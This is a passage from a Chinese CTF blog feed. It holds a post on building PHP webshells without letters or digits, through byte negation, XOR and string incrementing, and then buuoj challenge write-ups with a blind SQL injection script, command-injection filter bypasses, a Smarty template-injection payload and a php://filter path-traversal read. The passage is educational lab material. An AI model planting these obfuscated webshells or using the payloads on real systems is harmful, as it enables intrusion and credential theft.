class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;))</span><br><span class="line">b&#39;\xe5\x92\x8c&#39;</span><br><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">140</span><br><span class="line">&gt;&gt;&gt; print(~&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">-141</span><br></pre></td></tr></table></figure><p>“和”的第三个字节的值为140[0x8c]，取反的值为-141。<br>负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。<br>因此</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;&quot;和&quot;;</span><br><span class="line">print(~($_&#123;2&#125;));</span><br><span class="line">print(~&quot;\x8c&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">两个写法性质一样</span><br><span class="line">结果会输出： ss</span><br></pre></td></tr></table></figure><p>py脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def get(shell):</span><br><span class="line">     hexbit&#x3D;&#39;&#39;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))</span><br><span class="line">     print(hexbit)</span><br><span class="line"></span><br><span class="line">get(&#39;phpinfo&#39;)</span><br><span class="line">#0x8f0x970x8f0x960x910x990x90</span><br></pre></td></tr></table></figure><p>直接贴出p神的webshell吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);  &#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;  &#x2F;&#x2F;$_&#x3D;1</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;&#39;;</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;的&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;半&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;始&quot;;$____.&#x3D;~($___&#123;$__&#125;);    &#x2F;&#x2F;assert</span><br><span class="line"></span><br><span class="line">$_____&#x3D;&#39;_&#39;;$___&#x3D;&quot;俯&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;瞰&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;次&quot;;$_____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;站&quot;;$_____.&#x3D;~($___&#123;$_&#125;);   &#x2F;&#x2F;_POST</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$_____;   &#x2F;&#x2F;$_POST</span><br><span class="line">$____($_[$__]);    &#x2F;&#x2F;assert($_POST[2])</span><br></pre></td></tr></table></figure><p>这里也有一种简短的写法${~”\xa0\xb8\xba\xab”}它等于$_GET。这里相当于直接把utf8编码的某个字节提取出来统一进行取反。</p><h2 id="利用字符串自增-自减"><a href="#利用字符串自增-自减" class="headerlink" title="利用字符串自增/自减"></a>利用字符串自增/自减</h2><p>php的小技巧，先看文档：<a href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a><br><img src="/images/20200723234649.png" alt=""><br>也就是说，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。<br>数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。<br>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;[];</span><br><span class="line">$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;</span><br><span class="line">echo $_[0].$_[3];</span><br><span class="line">&#x2F;&#x2F; 输出Aa</span><br></pre></td></tr></table></figure><p>再加上我们不适用数字构造出的数字，写出下面这个webshell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$_&#x3D;[];</span><br><span class="line">$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;</span><br><span class="line">$_&#x3D;$_[(&#39;(&#39;&#x3D;&#x3D;&#39;&#x3D;&#39;)]; &#x2F;&#x2F; $_&#x3D;$_[0];$_&#x3D;A;</span><br><span class="line">$___&#x3D;$_; &#x2F;&#x2F; A</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; E</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; R</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; T</span><br><span class="line">$____&#x3D;&#39;_&#39;;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$____;</span><br><span class="line">@$___($_[_]);</span><br></pre></td></tr></table></figure><p>执行成功：<br><img src="/images/20200724000716.png" alt=""></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>在上面那道题中有一个payload是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p>这里利用了php7中执行动态函数的方法，在php5中是执行不成功的，我们来拆解分析一下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%ff ^ %160 &#x3D; _</span><br><span class="line">%ff ^ %184 &#x3D; G</span><br><span class="line">%ff ^ %186 &#x3D; E</span><br><span class="line">%ff ^ %171 &#x3D; T</span><br><span class="line">%ff%ff%ff%ff^%a0%b8%ba%ab &#x3D; _GET</span><br><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125; &#x3D; $_GET</span><br><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125; &#x3D; $_GET&#123;%ff&#125;</span><br><span class="line">phpinfo()</span><br></pre></td></tr></table></figure><p>这里放出一个fuzz脚本，帮助快速找到异或的字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; &#39;&#39;;</span><br><span class="line">$argv &#x3D; str_split(&#39;_GET&#39;);</span><br><span class="line"></span><br><span class="line">for ($i&#x3D;0; $i &lt; count($argv); $i++) &#123; </span><br><span class="line">for ($j&#x3D;0; $j &lt; 255; $j++) &#123; </span><br><span class="line">$k &#x3D; chr($j)^chr(255);  &#x2F;&#x2F;dechex(255)&#x3D;0xff</span><br><span class="line">if($k &#x3D;&#x3D; $argv[$i])&#123;</span><br><span class="line">echo &quot;%ff ^ %&quot;.$j.&quot; &#x3D; &quot;.$k.&quot;&lt;br&gt;&quot;;</span><br><span class="line">$payload .&#x3D; &#39;%&#39;.dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $payload;</span><br></pre></td></tr></table></figure><p><img src="/images/20200723223428.png" alt=""></p><p>还有一个payload是这样的，这个是取反：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p>还有这个payload，也是取反:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p>这个是<code>~</code>在{}中执行了取反操作，所以${~”\xa0\xb8\xba\xab”}取反相当于$_GET。</p><h1 id="脚本总结"><a href="#脚本总结" class="headerlink" title="脚本总结"></a>脚本总结</h1><h2 id="寻找异或字符脚本"><a href="#寻找异或字符脚本" class="headerlink" title="寻找异或字符脚本"></a>寻找异或字符脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload &#x3D; [writelist];</span><br><span class="line">for($k&#x3D;1;$k&lt;&#x3D;sizeof($payload);$k++)&#123;</span><br><span class="line">    for($i &#x3D; 0;$i &lt; 9; $i++)&#123;</span><br><span class="line">        for($j &#x3D; 0;$j &lt;&#x3D;9;$j++)&#123;</span><br><span class="line">            $exp &#x3D; $payload[$k] ^ $i.$j;</span><br><span class="line">            if($exp&#x3D;&#x3D;&#39;_G&#39;)&#123;</span><br><span class="line">            echo($payload[$k].&quot;^$i$j&quot;.&quot;&#x3D;&#x3D;&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        if($exp&#x3D;&#x3D;&#39;ET&#39;)&#123;</span><br><span class="line">        echo($payload[$k].&quot;^$i$j&quot;.&quot;&#x3D;&#x3D;&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="寻找取反字符脚本"><a href="#寻找取反字符脚本" class="headerlink" title="寻找取反字符脚本"></a>寻找取反字符脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">def get(shell):</span><br><span class="line">     hexbit&#x3D;&#39;&#39;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))</span><br><span class="line">     print(hexbit)</span><br><span class="line"></span><br><span class="line">get(&#39;phpinfo&#39;)</span><br><span class="line">&#x2F;&#x2F;0x8f0x970x8f0x960x910x990x90</span><br></pre></td></tr></table></figure><p>```</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近碰到一道题，便学习了一下相关无字母数字构造webshell的知识。题目如下：&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>buuoj 刷题记录（二）</title>
    <link href="http://yoursite.com/2020/07/20/buuoj-02/"/>
    <id>http://yoursite.com/2020/07/20/buuoj-02/</id>
    <published>2020-07-20T13:10:26.000Z</published>
    <updated>2020-07-31T08:17:37.621Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><blockquote><p>考点：盲注，文件上传<br>查看robots.txt：</p></blockquote><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure><p>抓包过程发现<strong>user.php</strong>和<strong>image.php</strong>，于是下载源码，查看image.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;</span><br><span class="line">$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$id&#x3D;addslashes($id);</span><br><span class="line">$path&#x3D;addslashes($path);</span><br><span class="line"></span><br><span class="line">$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);</span><br><span class="line">$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);</span><br><span class="line"></span><br><span class="line">$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);</span><br><span class="line">$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];</span><br><span class="line">header(&quot;Content-Type: image&#x2F;jpeg&quot;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>GET请求id和path参数时首先经过<strong>addslashes()</strong>函数转义，在<strong>单引号，双引号，反斜杠和NULL</strong>前面加上反斜杠“\”,<br>然后再经过<strong>str_replace()</strong>函数把<code>&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;</code>中的任意一个替换为空，<br>下面的select语句构造sql注入，传入的值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;\0&amp;path&#x3D; or 1&#x3D;1%23</span><br></pre></td></tr></table></figure><p>经过addslashes()处理之后select语句就变成了</p><figure class="highlight plain"><figcaption><span>* from images where id</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">再经过str_replace()函数处理之后变成了</span><br><span class="line">&#96;&#96;&#96;select * from images where id&#x3D;&#39;\&#39; or path&#x3D;&#39; or 1&#x3D;1%23&#39;&quot;);</span><br></pre></td></tr></table></figure><p>构造成功，盲注python脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;a9d9fc32-9b43-4a17-8c8b-d137102a6211.node3.buuoj.cn&#x2F;image.php&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(32,128):</span><br><span class="line">        # payload &#x3D; &#39;?id&#x3D;%5C0%27&amp;path&#x3D;%20or%20if(ascii(mid(database(),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)%23&#39;.format(i,j)</span><br><span class="line">        # 数据库： ciscnfinal</span><br><span class="line">        # payload &#x3D; &quot;?id&#x3D;%5C0%27&amp;path&#x3D;%20or%20if(ascii(mid((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;0x636973636e66696e616c),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)%23&quot;.format(i,j)</span><br><span class="line">        # 表名： images,users</span><br><span class="line">        #payload &#x3D; &quot;?id&#x3D;%5C0%27&amp;path&#x3D;%20or%20if(ascii(mid((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;0x7573657273),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)%23&quot;.format(i,j)</span><br><span class="line">        # users列名： username,password</span><br><span class="line">        payload &#x3D; &quot;?id&#x3D;%5C0&amp;path&#x3D;%20or%20if(ascii(mid((select%20group_concat(password)%20from%20users),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)%23&quot;.format(i,j)</span><br><span class="line">        # passwor: b5fef2a49e1cee3ee711</span><br><span class="line">        r &#x3D; requests.get(url+payload)</span><br><span class="line">        #print(url + path)</span><br><span class="line">        if len(r.text)&gt;10000:</span><br><span class="line">            flag +&#x3D; chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">    if(j&#x3D;&#x3D;127):</span><br><span class="line">        break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到账号和密码登陆，是一个上传界面<br>上传文件之后把上传日志记录到一个php文件，而没有给出文件路径，考虑文件名注入一句话，php被过滤，选择<code>&lt;?= ?&gt;</code>标签，即可，flag在根目录。</p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>f12一键获取flag。</p><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><blockquote><p>考点：php弱类型，命令注入<br>查看源码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;level 1</span><br><span class="line">if (isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    $num &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;level 2</span><br><span class="line">if (isset($_GET[&#39;md5&#39;]))&#123;</span><br><span class="line">   $md5&#x3D;$_GET[&#39;md5&#39;];</span><br><span class="line">   if ($md5&#x3D;&#x3D;md5($md5))</span><br><span class="line">       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;get flag</span><br><span class="line">if (isset($_GET[&#39;get_flag&#39;]))&#123;</span><br><span class="line">    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>一共有三层，第一层利用php弱类型，即可绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intval(&#39;2e4&#39;)&#x3D;2</span><br><span class="line">intval(&#39;2e4&#39;+1)&#x3D;20001</span><br></pre></td></tr></table></figure><p>第二层也是弱类型，找到一个0e开头的字符串，其md5值也是0e开头的字符串即可绕过，写个脚本跑一下就出来了。<br>第三层是执行命令，不能有空格和cat，空格用<code>$IFS$9</code>替换，cat用tac替换，然后读取flag。</p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><blockquote><p>考点：ssti模板注入</p></blockquote><p>打开页面发现页面会记录IP地址，第一时间想到存在XFF头注入，又看到提示Smarty,是模板注入了，抓包然后测试：<br><img src="/images/20200724011948.png" alt=""><br>当输入{1+1}的时候，显示2。看了看别人的writeup，<br>smarty中的{if}标签中可以执行php语句，得flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/20200724012403.png" alt=""></p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><blockquote><p>考点：文件包含</p></blockquote><p>进入页面两个按钮，随便点一个，出来一张图片，发现url变成了这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e7a037d7-b95d-419a-ae85-6f3acf5e0ea5.node3.buuoj.cn&#x2F;index.php?category&#x3D;woofers</span><br></pre></td></tr></table></figure><p>把woofers改为index发现不行，然后改为<code>index woofer</code>出现报错信息：<br><img src="/images/20200724012928.png" alt=""><br>可以发现include语句是这样的，获取url中的category参数然后拼接<code>.php</code>，然后包含这个php文件，尝试用伪协议读取文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></figure><p>base64解码得到index.php源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;category&#39;];</span><br><span class="line"></span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">include ($file . &#39;.php&#39;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>参数中必须包含<code>index,woofers,meowers</code>中的一个，然后这样刚好读到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a 